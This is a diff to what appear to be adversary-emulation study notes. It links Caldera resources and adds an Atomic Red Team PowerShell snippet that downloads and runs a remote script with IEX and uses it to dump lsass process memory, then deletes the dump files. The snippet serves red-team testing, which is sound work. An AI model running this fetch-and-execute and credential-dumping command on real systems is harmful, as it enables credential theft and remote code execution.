@@ -18,3 +18,14 @@ https://caldera.readthedocs.io/en/latest/Installing-Caldera.html
 
 YouTube Caldera Adversary Emulation:
 https://www.youtube.com/watch?v=EIHLXWnK1Dw&t=4378s
+
+
+
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+IEX (New-Object Net.WebClient).DownloadString('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+
+
+
+Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
